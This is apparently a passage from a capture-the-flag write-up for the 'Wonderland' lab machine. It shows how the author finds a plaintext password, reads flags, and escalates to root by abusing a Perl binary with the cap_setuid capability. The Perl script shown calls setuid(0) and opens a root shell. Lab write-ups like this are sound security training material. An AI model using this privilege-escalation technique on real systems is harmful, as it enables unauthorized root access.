Inside the /home/hatter there is the following

```bash
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```

We can ssh into it. This way we get the full hatter user. 

In the meantime i decided to check writeups to see if anyone had done anything differently and noticed that you can actually get the user flag from alice. Turns out you can move through the root directory, and so you can do the following:

```bash
alice@wonderland:~$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
```
Sometimes me feel dumb.

After a bit of ennumeration i found the following 

```bash
hatter@wonderland:~/.gnupg/private-keys-v1.d$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

So made the following little script that executes setuid and executes a shell 

```perl
use strict;
use warnings;
use POSIX;

my $username = "root";
my $uid = 0;

if (defined $uid) {
    POSIX::setuid($uid);
    print "Changed effective UID to $username ($uid)\n";
    system("/bin/bash -i");
    # Now, the effective UID is changed, and you can perform operations as this user.
    # Example: Access files that this user has permission to access.
} else {
    die "User $username not found\n";
}
```

And now we get the flag 

```bash
root@wonderland:/home/alice# cat root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```